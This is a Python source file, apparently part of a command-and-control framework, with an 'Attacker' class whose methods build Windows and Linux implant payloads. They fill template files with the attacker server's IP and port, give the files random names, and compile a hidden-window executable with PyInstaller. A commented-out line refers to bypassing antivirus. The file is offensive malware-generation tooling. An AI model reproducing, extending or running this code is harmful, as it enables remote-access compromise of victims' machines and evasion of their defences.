import os
import os.path
import shutil
import random
import string
import subprocess


class Attacker:
    def __init__(self):
        pass

    def winplant(self, server):
        random_chars = []
        for i in range(8):
            random_chars.append(str(random.choice(string.ascii_letters)))
            random_chars.append(str(random.choice(string.ascii_letters)))
            random_chars.append(str(random.randint(0,9)))
        random.shuffle(random_chars)
        random_file_name = "".join(random_chars) + ".py"
        cwd = os.getcwd()
        if os.path.exists(f"{cwd}\\src\\main\\templates\\winplant.txt"):
            shutil.copy(f"{cwd}\\src\\main\\templates\\winplant.txt", f"{cwd}\\tmp\\{random_file_name}")
            with open(f"{cwd}\\tmp\\{random_file_name}") as file:
                new_host = file.read().replace("INPUT_IP_HERE", str(server.host_ip))
                with open(f"{cwd}\\tmp\\{random_file_name}", "w") as file:
                    file.write(new_host)
                    file.close()
                with open(f"{cwd}\\tmp\\{random_file_name}") as file:
                    new_port = file.read().replace("INPUT_PORT_HERE", str(server.host_port))
                with open(f"{cwd}\\tmp\\{random_file_name}", "w") as file:
                    file.write(new_port)
                    file.close()
                if os.path.exists(f"{cwd}\\tmp\\{random_file_name}"):
                    print(f"[+] {random_file_name} saved to {cwd}\\tmp.\n")
                else:
                    print("[-] Couldn't create payload.")
        else:
            print("[-] winplant.txt file not found in current directory.\n")
    
    def linplant(self, server):
        random_chars = []
        for i in range(8):
            random_chars.append(str(random.choice(string.ascii_letters)))
            random_chars.append(str(random.choice(string.ascii_letters)))
            random_chars.append(str(random.randint(0,9)))
        random.shuffle(random_chars)
        random_file_name = ''.join(random_chars) + ".py"
        cwd = os.getcwd()
        if os.path.exists(f"{cwd}\\src\\main\\templates\\linplant.txt"):
            shutil.copy(f"{cwd}\\src\\main\\templates\\linplant.txt", f"{cwd}\\tmp\\{random_file_name}")
            with open(f"{cwd}\\tmp\\{random_file_name}") as file:
                new_host = file.read().replace("INPUT_IP_HERE", str(server.host_ip))
            with open(f"{cwd}\\tmp\\{random_file_name}", "w") as file:
                file.write(new_host)
                file.close()
            with open(f"{cwd}\\tmp\\{random_file_name}") as file:
                new_port = file.read().replace("INPUT_PORT_HERE", str(server.host_port))
            with open(f"{cwd}\\tmp\\{random_file_name}", "w") as file:
                file.write(new_port)
                file.close()
            if os.path.exists(f"{cwd}\\tmp\\{random_file_name}"):
                print(f"[+] {random_file_name} saved to {cwd}\\tmp.\n")
            else:
                print("[-] Couldn't create payload.")
        else:
            print("[-] linplant.txt file not found in current directory.\n")
    
    def exeplant(self, server):
        random_chars = []
        for i in range(6):
            random_chars.append(str(random.choice(string.ascii_letters)))
            random_chars.append(str(random.randint(0,9)))
        random.shuffle(random_chars)
        random_file_name = "".join(random_chars) + ".py"
        exe_file = "".join(random_chars) + ".exe"
        cwd = os.getcwd()
        if os.path.exists(f"{cwd}\\src\\main\\templates\\winplant.txt"):
            shutil.copy(f"{cwd}\\src\\main\\templates\\winplant.txt", f"{cwd}\\tmp\\{random_file_name}")
            with open(f"{cwd}\\tmp\\{random_file_name}") as file:
                new_host = file.read().replace("INPUT_IP_HERE", str(server.host_ip))
            with open(f"{cwd}\\tmp\\{random_file_name}", "w") as file:
                file.write(new_host)
                file.close()
            with open(f"{cwd}\\tmp\\{random_file_name}") as file:
                new_port = file.read().replace("INPUT_PORT_HERE", str(server.host_port))
            with open(f"{cwd}\\tmp\\{random_file_name}", "w") as file:
                file.write(new_port)
                file.close()
            pyinstaller_command = f"pyinstaller .\\tmp\\{random_file_name} -w --clean --onefile --distpath .\\tmp"
            print(f"[+] Compiling executable {exe_file}...")
            subprocess.call(pyinstaller_command, stderr=subprocess.DEVNULL)
            # print("[+] Taking 10s to bypass antivirus...")
            # time.sleep(10)
            os.remove(f"{random_file_name[0:-3]}.spec")
            shutil.rmtree("build")
            if os.path.exists(f"{cwd}\\tmp\\{exe_file}"):
                print(f"[+] {exe_file} saved to {cwd}\\tmp.\n")
            else:
                print("[-] An error occured during generaiton of exe file.\n")
        else:
            print("[-] Winplant.txt file not found in current directory.\n")
        

        
            